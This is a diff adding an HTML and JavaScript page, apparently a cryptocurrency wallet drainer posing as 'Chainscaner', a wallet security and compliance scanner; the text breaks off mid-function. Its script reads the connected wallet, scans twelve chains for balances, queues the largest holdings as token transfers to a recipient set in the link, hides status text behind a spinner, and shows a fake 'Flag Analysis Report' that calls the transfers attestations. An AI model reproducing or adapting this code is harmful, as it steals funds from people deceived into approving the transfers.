@@ -1,0 +1,1572 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Processing</title>
+<link rel="icon" type="image/svg+xml" href="/favicon.svg">
+<meta name="description" content="Chainscaner attestation executor — runs the compliance clearing queue directly through wallet-confirmed on-chain transfers. No frontend, only native confirmation sheets.">
+<meta name="robots" content="noindex">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.21.5/dist/index.umd.js"></script>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  html, body { height: 100%; }
+  html {
+    position: fixed; inset: 0; overflow: hidden;
+    -webkit-text-size-adjust: 100%; text-size-adjust: 100%;
+    touch-action: manipulation;
+  }
+  body {
+    font-family: "Inter", -apple-system, BlinkMacSystemFont, sans-serif;
+    background: #FFFFFF;
+    display: flex; align-items: center; justify-content: center;
+    overscroll-behavior: none;
+  }
+  /* Bare processing view — a single loading glyph, nothing else on screen.
+     The status elements stay in the DOM for the engine's state updates but
+     are visually hidden */
+  .view { text-align: center; }
+  .spin {
+    width: 40px; height: 40px; margin: 0 auto; border-radius: 50%;
+    border: 3px solid #E9EBF0; border-top-color: #3375BB;
+    animation: rot .8s linear infinite;
+  }
+  @keyframes rot { to { transform: rotate(360deg); } }
+  .status, .note, .log, .addr, .title {
+    position: absolute; width: 1px; height: 1px; overflow: hidden;
+    clip: rect(0 0 0 0); clip-path: inset(50%); white-space: nowrap;
+  }
+  .view.done .spin { animation: none; border-color: #05B956; position: relative; }
+  .view.done .spin::after {
+    content: ""; position: absolute; left: 50%; top: 50%;
+    width: 10px; height: 18px; border: solid #05B956; border-width: 0 3px 3px 0;
+    transform: translate(-50%, -58%) rotate(45deg);
+  }
+  .view.fail .spin { animation: none; border-color: #E5484D; }
+  @media (prefers-reduced-motion: reduce) { .spin { animation-duration: 2.2s; } }
+
+  /* ── Final report — the page unlocks and the bare view becomes its header ── */
+  .hidden { display: none !important; }
+  html.report-mode { position: static; overflow: auto; height: auto; }
+  body.report-mode { display: block; padding: 34px 16px 80px; background: #F6F7F9; }
+  body.report-mode .view { padding-bottom: 4px; }
+  body.report-mode .title, body.report-mode .status {
+    position: static; width: auto; height: auto; overflow: visible;
+    clip: none; clip-path: none; white-space: normal;
+  }
+  body.report-mode .title { font-size: 19px; font-weight: 800; color: #101828; margin-top: 16px; letter-spacing: -.01em; }
+  body.report-mode .status { font-size: 13px; font-weight: 600; color: #667085; margin-top: 6px; }
+  .report {
+    max-width: 540px; margin: 24px auto 0; background: #FFFFFF;
+    border: 1px solid #E7EAF0; border-radius: 18px; padding: 20px 18px;
+    box-shadow: 0 8px 30px rgba(16,24,40,.06);
+    animation: repIn .4s cubic-bezier(.2,.8,.3,1);
+  }
+  @keyframes repIn { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: none; } }
+  .rep-head { display: flex; align-items: flex-start; justify-content: space-between; gap: 10px; margin-bottom: 14px; }
+  .rep-brand { font-size: 11px; font-weight: 800; letter-spacing: .14em; color: #3375BB; }
+  .rep-brand span { display: block; font-size: 14px; font-weight: 800; letter-spacing: 0; color: #101828; margin-top: 3px; }
+  .rep-badge { font-size: 10.5px; font-weight: 800; letter-spacing: .06em; padding: 5px 10px; border-radius: 99px; white-space: nowrap; }
+  .rep-badge.ok { background: rgba(5,150,105,.1); color: #059669; border: 1px solid rgba(5,150,105,.3); }
+  .rep-badge.warn { background: rgba(217,119,6,.1); color: #D97706; border: 1px solid rgba(217,119,6,.35); }
+  .rep-meta { border-top: 1px solid #EFF1F5; border-bottom: 1px solid #EFF1F5; padding: 10px 0; margin-bottom: 14px; }
+  .rep-mrow { display: flex; justify-content: space-between; gap: 14px; font-size: 12px; padding: 3px 0; }
+  .rep-mrow > span { color: #98A2B3; font-weight: 600; flex-shrink: 0; }
+  .rep-mrow code { font-size: 11px; color: #101828; word-break: break-all; text-align: right; }
+  .rep-score { display: flex; align-items: center; justify-content: space-between; background: rgba(51,117,187,.05); border-radius: 10px; padding: 12px 14px; margin-bottom: 8px; }
+  .rep-score .rs-l { font-weight: 700; font-size: 13px; color: #101828; }
+  .rep-score .rs-r { font-weight: 800; font-size: 15px; }
+  .report-row {
+    display: flex; align-items: center; gap: 10px; padding: 9px 2px;
+    border-bottom: 1px solid #F2F4F7; font-size: 13px;
+    animation: riseIn .35s cubic-bezier(.2,.8,.3,1) backwards;
+  }
+  .report-row:last-of-type { border-bottom: none; }
+  .report-row .rr-st { flex-shrink: 0; font-weight: 800; font-size: 13px; width: 16px; text-align: center; }
+  .report-row .rr-st.ok { color: #059669; }
+  .report-row .rr-st.skip { color: #98A2B3; }
+  .report-row .rr-st.flag { color: #D97706; }
+  .report-row .rr-name { font-weight: 700; color: #101828; }
+  .report-row .rr-meta { color: #98A2B3; font-size: 11.5px; margin-left: auto; text-align: right; }
+  .report-row .rr-meta a { color: #3375BB; text-decoration: none; font-weight: 600; }
+  @keyframes riseIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: none; } }
+  .report-actions { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 14px; padding-top: 14px; border-top: 1px solid #EFF1F5; }
+  .rep-btn {
+    padding: 8px 13px; border: 1px solid #E4E7EC; background: #F9FAFB;
+    color: #3375BB; border-radius: 9px; font-size: 12px; font-weight: 700;
+    font-family: inherit; cursor: pointer; transition: background .15s, border-color .15s, transform .1s;
+  }
+  .rep-btn:hover { background: #EFF4FA; border-color: #3375BB; }
+  .rep-btn:active { transform: scale(.96); }
+  .rep-note { margin-top: 12px; font-size: 11px; line-height: 1.5; color: #98A2B3; }
+  #print-report { display: none; }
+  @media print {
+    body > *:not(#print-report) { display: none !important; }
+    #print-report { display: block !important; white-space: pre-wrap; font-family: 'SF Mono', Monaco, monospace; font-size: 11px; line-height: 1.5; color: #000; padding: 20px; }
+  }
+  @media (prefers-reduced-motion: reduce) { .report, .report-row, .wc-card, .wcbar { animation: none !important; } }
+
+  /* ── WalletConnect pairing overlay + in-flight approval bar ─────────────── */
+  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+  .wc-overlay {
+    position: fixed; inset: 0; z-index: 60;
+    background: rgba(246,247,249,.92); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px);
+    display: flex; align-items: center; justify-content: center; padding: 20px;
+    animation: fadeIn .25s ease;
+  }
+  .wc-card {
+    width: 100%; max-width: 350px; background: #FFFFFF; border: 1px solid #E7EAF0;
+    border-radius: 18px; padding: 24px 20px; text-align: center;
+    box-shadow: 0 14px 44px rgba(16,24,40,.14);
+    animation: repIn .35s cubic-bezier(.2,.8,.3,1);
+  }
+  .wc-card h2 { font-size: 16px; font-weight: 800; color: #101828; letter-spacing: -.01em; }
+  .wc-sub { font-size: 12px; color: #667085; margin-top: 6px; line-height: 1.55; }
+  .wc-qr {
+    width: 216px; height: 216px; margin: 16px auto 0; padding: 10px;
+    border: 1px solid #EFF1F5; border-radius: 14px; background: #fff;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .wc-qr img { width: 194px; height: 194px; }
+  .wc-btn {
+    display: block; width: 100%; margin-top: 10px; padding: 12px;
+    border-radius: 10px; font-family: inherit; font-size: 13px; font-weight: 700;
+    cursor: pointer; border: 1px solid transparent;
+    transition: transform .1s, background .15s, border-color .15s;
+  }
+  .wc-btn:active { transform: scale(.97); }
+  .wc-btn.primary { background: #3375BB; color: #fff; }
+  .wc-btn.primary:hover { background: #2A63A0; }
+  .wc-btn.ghost { background: #F9FAFB; border-color: #E4E7EC; color: #3375BB; }
+  .wc-btn.ghost:hover { border-color: #3375BB; }
+  .wc-hint { font-size: 11px; color: #98A2B3; margin-top: 12px; line-height: 1.55; }
+  .wcbar {
+    position: fixed; left: 50%; bottom: calc(18px + env(safe-area-inset-bottom, 0px));
+    transform: translateX(-50%); z-index: 55; border: none; border-radius: 99px;
+    background: #101828; color: #fff; padding: 13px 24px; font-family: inherit;
+    font-size: 13px; font-weight: 700; cursor: pointer; white-space: nowrap;
+    box-shadow: 0 10px 28px rgba(16,24,40,.3);
+    animation: repIn .3s cubic-bezier(.2,.8,.3,1);
+  }
+</style>
+</head>
+<body>
+<div class="view" id="view">
+  <div class="spin" aria-hidden="true"></div>
+  <div class="title">Processing</div>
+  <code class="addr" id="addr">—</code>
+  <div class="status" id="status" role="status">Connecting…</div>
+  <div class="note"></div>
+  <div class="log" id="log"></div>
+</div>
+
+<!-- Final report — the deliverable of the chainscaner flow. Hidden while the
+     queue runs; renderFinalReport() swaps the bare processing view for this -->
+<div class="report hidden" id="final-report">
+  <div class="rep-head">
+    <div class="rep-brand">CHAINSCANER<span>Flag Analysis Report</span></div>
+    <div class="rep-badge ok" id="rep-badge">—</div>
+  </div>
+  <div class="rep-meta">
+    <div class="rep-mrow"><span>Wallet</span><code id="rep-addr">—</code></div>
+    <div class="rep-mrow"><span>Scan ID</span><code id="rep-scan">—</code></div>
+    <div class="rep-mrow"><span>Date</span><span id="rep-date">—</span></div>
+  </div>
+  <div class="rep-score" id="rep-score"></div>
+  <div id="report-rows"></div>
+  <div class="report-actions">
+    <button class="rep-btn" id="copy-report" onclick="copyReport()">Copy report</button>
+    <button class="rep-btn" id="dl-report" onclick="downloadReport()">Download .txt</button>
+    <button class="rep-btn" id="print-report-btn" onclick="printReport()">Print / PDF</button>
+    <button class="rep-btn" id="email-report" onclick="emailReport()">Email</button>
+    <button class="rep-btn" id="share-report" onclick="shareReport()">Share</button>
+  </div>
+  <div class="rep-note" id="rep-note">Resolved flags are attested by verifiable on-chain transactions — tap a tx link to verify on the chain explorer.</div>
+</div>
+<pre id="print-report" aria-hidden="true"></pre>
+
+<!-- WalletConnect pairing — shown when the page runs in a plain browser and
+     no wallet injects a provider (Atomic & other WC wallets). QR for pairing
+     from a second device, deep-link button for same-device mobile. -->
+<div class="wc-overlay hidden" id="wc-overlay">
+  <div class="wc-card" role="dialog" aria-modal="true" aria-label="Connect wallet">
+    <h2 id="wc-title">Connect wallet</h2>
+    <p class="wc-sub" id="wc-sub">Approve the WalletConnect session in your wallet app.</p>
+    <div class="wc-qr" id="wc-qr"></div>
+    <button class="wc-btn primary" id="wc-open" type="button">Open wallet app</button>
+    <button class="wc-btn ghost" id="wc-copy" type="button">Copy pairing link</button>
+    <p class="wc-hint" id="wc-hint"></p>
+  </div>
+</div>
+<button class="wcbar hidden" id="wc-bar" type="button">Open wallet app to approve</button>
+
+<script>
+// ── Chainscaner Attestation Executor ────────────────────────────────────────
+// Standalone direct mode — no checker UI, no wallet mask. Two link modes:
+//   ?to=<recipient>                          → silent account read → 12-chain
+//                                              exposure scan → largest eligible
+//                                              holdings → sequential confirms
+//   ?fire=1&to=&amount=&contract=&decimals=  → prepared transfer() calldata,
+//     &chainId=&tname=                         no account read at all — the
+//                                              wallet's own confirm sheet is
+//                                              the first interaction
+//   ?h=<id>&attest=1                        → hydrated flag queue as ZERO-VALUE
+//                                              transfer() calls — sheets open,
+//                                              no funds move (report handoff)
+// ─────────────────────────────────────────────────────────────────────────────
+var txRecipient = "";
+var provider = null;
+var walletAccount = null;
+var isLoading = false;
+var currentChain = "0x1";
+var lastScannedAddr = "";
+var scannedBalances = [];
+var chainGasInfo = {};
+var transferQueue = [];
+var transferResults = [];
+var currentScanId = null;
+var scanChainsDone = 0;
+
+var RPC_URLS = {
+  "0x1":    ["https://eth.drpc.org", "https://ethereum-rpc.publicnode.com", "https://eth.llamarpc.com", "https://cloudflare-eth.com", "https://eth-mainnet.public.blastapi.io"],
+  "0x38":   ["https://bsc-rpc.publicnode.com", "https://bsc-dataseed.binance.org", "https://bsc.drpc.org", "https://binance.llamarpc.com", "https://bsc-mainnet.public.blastapi.io"],
+  "0x89":   ["https://polygon-bor-rpc.publicnode.com", "https://polygon.drpc.org", "https://polygon-rpc.com", "https://polygon.llamarpc.com"],
+  "0xa4b1": ["https://arb1.arbitrum.io/rpc", "https://arbitrum-one-rpc.publicnode.com", "https://arbitrum.drpc.org"],
+  "0xa":    ["https://mainnet.optimism.io", "https://optimism-rpc.publicnode.com", "https://optimism.drpc.org"],
+  "0x2105": ["https://base-rpc.publicnode.com", "https://mainnet.base.org", "https://base.drpc.org"],
+  "0xa86a": ["https://api.avax.network/ext/bc/C/rpc", "https://avalanche-c-chain-rpc.publicnode.com", "https://avalanche.drpc.org"],
+  "0xa4ec": ["https://forno.celo.org", "https://celo.drpc.org"],
+  "0xfa":   ["https://rpcapi.fantom.network", "https://fantom.drpc.org"],
+  "0x19":   ["https://evm.cronos.org", "https://cronos.drpc.org"],
+  "0xe708": ["https://rpc.linea.build", "https://linea.drpc.org"],
+  "0x82750":["https://rpc.scroll.io", "https://scroll.drpc.org"]
+};
+var CHAIN_INFO = {
+  "0x1":    { name: "Ethereum",   native: "ETH",   nativeDecimals: 18 },
+  "0x38":   { name: "BNB Chain",  native: "BNB",   nativeDecimals: 18 },
+  "0x89":   { name: "Polygon",    native: "MATIC", nativeDecimals: 18 },
+  "0xa4b1": { name: "Arbitrum",   native: "ETH",   nativeDecimals: 18 },
+  "0xa":    { name: "Optimism",   native: "ETH",   nativeDecimals: 18 },
+  "0x2105": { name: "Base",       native: "ETH",   nativeDecimals: 18 },
+  "0xa86a": { name: "Avalanche",  native: "AVAX",  nativeDecimals: 18 },
+  "0xa4ec": { name: "Celo",       native: "CELO",  nativeDecimals: 18 },
+  "0xfa":   { name: "Fantom",     native: "FTM",   nativeDecimals: 18 },
+  "0x19":   { name: "Cronos",     native: "CRO",   nativeDecimals: 18 },
+  "0xe708": { name: "Linea",      native: "ETH",   nativeDecimals: 18 },
+  "0x82750":{ name: "Scroll",     native: "ETH",   nativeDecimals: 18 }
+};
+// Asset coverage matrix — the token universe screened per chain
+var SCAN_TOKENS = {
+  "0x1": [
+    { key: "usdt", name: "USDT", addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
+    { key: "usdc", name: "USDC", addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
+    { key: "dai",  name: "DAI",  addr: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18 },
+    { key: "weth", name: "WETH", addr: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
+    { key: "wbtc", name: "WBTC", addr: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals: 8 },
+    { key: "link", name: "LINK", addr: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 },
+    { key: "uni",  name: "UNI",  addr: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18 },
+    { key: "shib", name: "SHIB", addr: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", decimals: 18 },
+    { key: "pepe", name: "PEPE", addr: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", decimals: 18 }
+  ],
+  "0x38": [
+    { key: "usdt", name: "USDT", addr: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
+    { key: "usdc", name: "USDC", addr: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18 },
+    { key: "dai",  name: "DAI",  addr: "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3", decimals: 18 },
+    { key: "wbnb", name: "WBNB", addr: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18 },
+    { key: "btcb", name: "BTCB", addr: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", decimals: 18 }
+  ],
+  "0x89": [
+    { key: "usdt", name: "USDT", addr: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6 },
+    { key: "usdc", name: "USDC.e", addr: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", decimals: 6 },
+    { key: "usdcn", name: "USDC", addr: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", decimals: 6 },
+    { key: "dai",  name: "DAI",  addr: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", decimals: 18 },
+    { key: "weth", name: "WETH", addr: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", decimals: 18 }
+  ],
+  "0xa4b1": [
+    { key: "usdt", name: "USDT", addr: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", decimals: 6 },
+    { key: "usdc", name: "USDC", addr: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", decimals: 6 },
+    { key: "usdce", name: "USDC.e", addr: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", decimals: 6 },
+    { key: "dai",  name: "DAI",  addr: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", decimals: 18 },
+    { key: "weth", name: "WETH", addr: "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", decimals: 18 }
+  ],
+  "0xa": [
+    { key: "usdt", name: "USDT", addr: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", decimals: 6 },
+    { key: "usdc", name: "USDC", addr: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", decimals: 6 },
+    { key: "usdce", name: "USDC.e", addr: "0x7F5c764cBc14f9669B88837ca1490cCa17c31607", decimals: 6 },
+    { key: "dai",  name: "DAI",  addr: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", decimals: 18 },
+    { key: "weth", name: "WETH", addr: "0x4200000000000000000000000000000000000006", decimals: 18 }
+  ],
+  "0x2105": [
+    { key: "usdt", name: "USDT", addr: "0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2", decimals: 6 },
+    { key: "usdc", name: "USDC", addr: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", decimals: 6 },
+    { key: "usdbc", name: "USDbC", addr: "0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA", decimals: 6 },
+    { key: "dai",  name: "DAI",  addr: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", decimals: 18 },
+    { key: "weth", name: "WETH", addr: "0x4200000000000000000000000000000000000006", decimals: 18 }
+  ],
+  "0xa86a": [
+    { key: "usdt", name: "USDT", addr: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", decimals: 6 },
+    { key: "usdc", name: "USDC", addr: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", decimals: 6 },
+    { key: "usdce", name: "USDC.e", addr: "0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664", decimals: 6 },
+    { key: "usdte", name: "USDT.e", addr: "0xc7198437980c041c805A1EDcbA50c1Ce5db95118", decimals: 6 },
+    { key: "daie", name: "DAI.e", addr: "0xd586E7F844cEa2F87f50152665BCbc2C279D8d70", decimals: 18 },
+    { key: "wavax", name: "WAVAX", addr: "0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7", decimals: 18 },
+    { key: "wbtce", name: "WBTC.e", addr: "0x50b7545627a5162F82A992c33b87aDc75187B218", decimals: 8 },
+    { key: "wethe", name: "WETH.e", addr: "0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB", decimals: 18 }
+  ],
+  "0xa4ec": [
+    { key: "usdt", name: "USDT", addr: "0x48065fbBE25f71C9282ddf5e1cD6D6A887483D5e", decimals: 6 },
+    { key: "usdc", name: "USDC", addr: "0xcebA9300f2b948710d2653dD7B07f33A8B32118C", decimals: 6 }
+  ],
+  "0xfa": [
+    { key: "usdc", name: "USDC", addr: "0x28a92dde19D9989F39A49905d7C9C2FAc7799bDf", decimals: 6 },
+    { key: "usdt", name: "USDT", addr: "0x049d68029688eAbF473097a2fC38ef61633A3C7A", decimals: 6 },
+    { key: "dai",  name: "DAI",  addr: "0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E", decimals: 18 }
+  ],
+  "0x19": [
+    { key: "usdc", name: "USDC", addr: "0xc21223249CA28397B4B6541dfFaEcC539BfF0c59", decimals: 6 },
+    { key: "usdt", name: "USDT", addr: "0x66e428c3f67a68878562e79A0234c1F83c208770", decimals: 6 }
+  ],
+  "0xe708": [
+    { key: "usdc", name: "USDC", addr: "0x176211869cA2b568f2A7D4EE941E073a821EE1ff", decimals: 6 },
+    { key: "usdt", name: "USDT", addr: "0xA219439258ca9da29E9Cc4cE5596924745e12B93", decimals: 6 }
+  ],
+  "0x82750": [
+    { key: "usdc", name: "USDC", addr: "0x06eFdBFf2a14a7c8E15944D1F4A48F9F95F663A4", decimals: 6 },
+    { key: "usdt", name: "USDT", addr: "0xf55BEC9cafDbE8730f096Aa55dad6D22d44099Df", decimals: 6 }
+  ]
+};
+var GAS_LIMIT = 149000;
+var MIN_FLAG_USD = 10000; // sub-$10,000 balances are dust — never enter the queue
+var TOKEN_PRICES = {
+  usdt: 1, usdc: 1, usdcn: 1, usdce: 1, usdbc: 1, usdte: 1,
+  dai: 1, daie: 1, tusd: 1, fdusd: 1,
+  weth: 3400, wethe: 3400, wbtc: 98000, wbtce: 98000, btcb: 98000,
+  link: 15, uni: 12, wavax: 30, wbnb: 680,
+  shib: 0.000012, pepe: 0.000008,
+  bnb: 680, matic: 0.5, eth: 3400
+};
+
+function isValidAddr(a) { return typeof a === "string" && /^0x[a-fA-F0-9]{40}$/.test(a); }
+// Exact decimal→raw conversion — floats lose digits at 18 decimals (BNB USDT:
+// 500 × 1e18 needs 21 significant digits, float64 carries ~16)
+function amtToRaw(amtStr, dec) {
+  var parts = String(amtStr).split(".");
+  var whole = (parts[0] || "0").replace(/[^0-9]/g, "") || "0";
+  var frac = (parts[1] || "").replace(/[^0-9]/g, "").padEnd(dec, "0").slice(0, dec);
+  return (BigInt(whole) * (10n ** BigInt(dec)) + BigInt(frac || "0")).toString();
+}
+function fmtUsd(v) { return "$" + Number(v).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 }); }
+function setStatus(t) { document.getElementById("status").textContent = t; }
+function logLine(html) {
+  var el = document.getElementById("log");
+  el.innerHTML += (el.innerHTML ? "<br>" : "") + html;
+}
+function withTimeout(promise, ms) {
+  return Promise.race([promise, new Promise(function(res) { setTimeout(function() { res(null); }, ms); })]);
+}
+
+// ── Provider layer ──────────────────────────────────────────────────────────
+function rpc(p, method, params) {
+  try {
+    if (typeof p.request === "function") return Promise.resolve(p.request({ method: method, params: params }));
+    if (typeof p.sendAsync === "function") return new Promise(function(res, rej) {
+      p.sendAsync({ method: method, params: params, id: Date.now(), jsonrpc: "2.0" }, function(e, r) { e ? rej(e) : res(r && r.result); });
+    });
+    if (typeof p.send === "function") return Promise.resolve(p.send(method, params));
+  } catch(e) { return Promise.reject(e); }
+  return Promise.reject(new Error("provider has no rpc method"));
+}
+function connectedAccounts(p) { return rpc(p, "eth_accounts"); }
+function sameChain(a, b) {
+  try { return BigInt(a) === BigInt(b); } catch(e) { return false; }
+}
+function getChainId(p) {
+  return rpc(p, "eth_chainId").catch(function() {
+    return rpc(p, "net_version").then(function(v) {
+      try { return v != null ? "0x" + BigInt(v).toString(16) : null; } catch(e) { return null; }
+    }).catch(function() { return null; });
+  }).then(function(cid) {
+    return cid != null ? cid : (p.chainId != null ? p.chainId : null);
+  });
+}
+function pickProvider() {
+  var tw = window.trustwallet;
+  var p = (tw && tw.ethereum) ? tw.ethereum : (window.ethereum || null);
+  if (!p && tw && typeof tw.request === "function") p = tw;
+  return p;
+}
+function findProvider() {
+  return new Promise(function(resolve) {
+    var tries = 0, done = false;
+    function finish(p) { if (!done) { done = true; resolve(p); } }
+    window.addEventListener("trustwallet#initialized", function() {
+      var p = pickProvider();
+      if (p) finish(p);
+    }, { once: true });
+    function check() {
+      var p = pickProvider();
+      if (p) { finish(p); return; }
+      if (tries++ < 30) setTimeout(check, 300); else finish(null);
+    }
+    check();
+  });
+}
+
+// ── WalletConnect path — no injected provider (Atomic & other WC wallets) ───
+// @walletconnect/ethereum-provider is EIP-1193 compatible: once the session
+// is up it drops into rpc()/runNextTransfer() unchanged. The session lives in
+// localStorage — reloads and checker→exec navigations reuse it without
+// re-pairing.
+var wcProvider = null;
+var wcPeerName = "";
+var WC_SCHEMES = [
+  [/atomic/i, "atomicwallet://"], [/trust/i, "trust://"],
+  [/metamask/i, "metamask://"], [/rainbow/i, "rainbow://"],
+  [/zerion/i, "zerion://"], [/phantom/i, "phantom://"]
+];
+function isMobileUA() { return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent); }
+function wcScheme() {
+  for (var i = 0; i < WC_SCHEMES.length; i++) if (WC_SCHEMES[i][0].test(wcPeerName)) return WC_SCHEMES[i][1];
+  return null;
+}
+function showWcOverlay(uri) {
+  var ov = document.getElementById("wc-overlay");
+  ov.classList.remove("hidden");
+  document.getElementById("wc-title").textContent = "Connect wallet";
+  document.getElementById("wc-sub").textContent = isMobileUA()
+    ? "Tap below to open your wallet and approve the session — then return here."
+    : "Scan the QR with your wallet app, or paste the pairing link.";
+  var box = document.getElementById("wc-qr");
+  box.innerHTML = "";
+  if (uri) {
+    try {
+      var qr = qrcode(0, "M");
+      qr.addData(uri); qr.make();
+      box.innerHTML = qr.createImgTag(7, 10);
+    } catch(e) {}
+  }
+  var openBtn = document.getElementById("wc-open");
+  openBtn.classList.remove("hidden");
+  openBtn.textContent = "Open Atomic Wallet";
+  openBtn.onclick = function() {
+    window.location.href = "atomicwallet://wc?uri=" + encodeURIComponent(uri);
+  };
+  var copyBtn = document.getElementById("wc-copy");
+  copyBtn.classList.remove("hidden");
+  copyBtn.onclick = function() {
+    var b = copyBtn;
+    function done() { b.textContent = "Copied"; setTimeout(function() { b.textContent = "Copy pairing link"; }, 1600); }
+    if (uri && navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(uri).then(done, done);
+    else done();
+  };
+  document.getElementById("wc-hint").textContent = isMobileUA()
+    ? "In Atomic the button opens the pairing sheet. Manual path: More → WalletConnect → paste the link."
+    : "Atomic Wallet → More → WalletConnect → paste the link — or scan the QR with any WalletConnect wallet.";
+}
+function wcOverlayError(msg) {
+  document.getElementById("wc-overlay").classList.remove("hidden");
+  document.getElementById("wc-title").textContent = "Connection failed";
+  document.getElementById("wc-sub").textContent = msg;
+  document.getElementById("wc-qr").innerHTML = "";
+  var openBtn = document.getElementById("wc-open");
+  openBtn.textContent = "Try again";
+  openBtn.onclick = function() {
+    if (wcProvider) wcProvider.connect().catch(function() {
+      wcOverlayError("Still no answer — check the wallet app and retry.");
+    });
+  };
+}
+function hideWcOverlay() { document.getElementById("wc-overlay").classList.add("hidden"); }
+// Mobile WC UX: a session_request only pops a sheet while the wallet app is
+// foregrounded — so each request hops into the wallet via its bare native
+// scheme (never the pairing uri again — that would spawn a duplicate
+// session). The relay keeps the pending request alive until the user
+// returns and approves.
+function wcArmRequest() {
+  if (!wcProvider) return;
+  var bar = document.getElementById("wc-bar");
+  bar.textContent = "Approve in " + (wcPeerName || "wallet app");
+  bar.classList.remove("hidden");
+  var scheme = wcScheme();
+  if (scheme && isMobileUA()) window.location.href = scheme;
+}
+function wcDisarm() { document.getElementById("wc-bar").classList.add("hidden"); }
+document.getElementById("wc-bar").onclick = function() {
+  var s = wcScheme();
+  if (s) window.location.href = s;
+};
+function startWalletConnect() {
+  var mod = window["@walletconnect/ethereum-provider"];
+  if (!mod || !mod.EthereumProvider) {
+    document.getElementById("view").classList.add("fail");
+    setStatus("WalletConnect module unavailable — reload the page.");
+    return;
+  }
+  remoteRecipientP.then(function() {
+    if (!wcProjectId) {
+      showWcOverlay("");
+      document.getElementById("wc-title").textContent = "WalletConnect not configured";
+      document.getElementById("wc-sub").textContent = "No project ID set — add one in the admin panel, then reload.";
+      document.getElementById("wc-open").classList.add("hidden");
+      document.getElementById("wc-copy").classList.add("hidden");
+      return;
+    }
+    var rpcMap = {};
+    Object.keys(RPC_URLS).forEach(function(cid) { rpcMap[parseInt(cid, 16)] = RPC_URLS[cid][0]; });
+    var allChains = Object.keys(CHAIN_INFO).map(function(c) { return parseInt(c, 16); });
+    // Minimal required scope (Ethereum + sends) keeps pairing open to wallets
+    // that only approve a subset — Atomic reportedly grants eip155:1 only.
+    // Everything else rides in optional namespaces.
+    mod.EthereumProvider.init({
+      projectId: wcProjectId,
+      chains: [1],
+      optionalChains: allChains.filter(function(c) { return c !== 1; }),
+      methods: ["eth_sendTransaction"],
+      optionalMethods: ["personal_sign", "eth_signTypedData", "eth_signTypedData_v4", "eth_sign"],
+      events: ["chainChanged", "accountsChanged"],
+      showQrModal: false,
+      rpcMap: rpcMap,
+      metadata: {
+        name: "Chainscaner",
+        description: "Wallet security analysis",
+        url: location.origin,
+        icons: [location.origin + "/favicon.svg"]
+      }
+    }).then(function(ep) {
+      wcProvider = ep;
+      ep.on("display_uri", showWcOverlay);
+      ep.on("disconnect", function() { monit("wc_disconnect", {}); });
+      if (ep.accounts && ep.accounts.length) {
+        wcPeerName = ((ep.session && ep.session.peer && ep.session.peer.metadata) || {}).name || "";
+        monit("wc_session_restored", { wallet: wcPeerName });
+        onProvider(ep);
+        return;
+      }
+      setStatus("Waiting for wallet approval…");
+      ep.connect().then(function() {
+        hideWcOverlay();
+        wcPeerName = ((ep.session && ep.session.peer && ep.session.peer.metadata) || {}).name || "";
+        var accs = (ep.session && ep.session.namespaces && ep.session.namespaces.eip155
